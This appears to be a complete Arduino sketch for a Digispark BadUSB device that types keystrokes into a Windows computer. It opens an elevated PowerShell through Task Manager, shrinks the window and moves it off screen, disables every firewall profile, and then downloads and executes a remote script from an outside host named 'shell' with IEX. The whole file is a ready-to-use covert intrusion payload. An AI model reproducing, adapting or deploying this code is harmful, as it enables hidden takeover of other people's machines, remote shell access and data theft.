#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
#define KEY_DOWN 0x51 // Keyboard Down Arrow
#define KEY_ENTER 0x28 //Return/Enter Key
void setup() { pinMode(1, OUTPUT); }
void loop() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(500);
  DigiKeyboard.println("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"); 
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("powershell -nop \"IEX (New-Object Net.WebClient).DownloadString('https://actoflove.co/shell');\"");
  digitalWrite(1, HIGH);
  for(;;){ }
}
